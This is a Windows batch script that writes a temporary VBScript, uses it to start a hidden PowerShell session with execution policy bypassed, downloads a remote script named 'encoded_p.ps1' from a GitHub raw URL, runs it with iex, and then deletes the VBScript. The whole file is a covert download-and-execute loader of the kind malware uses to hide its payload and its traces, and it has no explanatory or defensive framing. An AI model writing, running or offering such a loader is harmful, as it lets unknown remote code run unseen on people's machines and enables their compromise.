@echo off
setlocal

echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\runhidden.vbs"
echo WshShell.Run "powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ""iex (iwr 'https://raw.githubusercontent.com/allisonmorat/three/main/encoded_p.ps1' -UseBasicParsing).Content""", 0, False >> "%temp%\runhidden.vbs"

cscript //nologo "%temp%\runhidden.vbs"

del "%temp%\runhidden.vbs" >nul 2>&1

endlocal
exit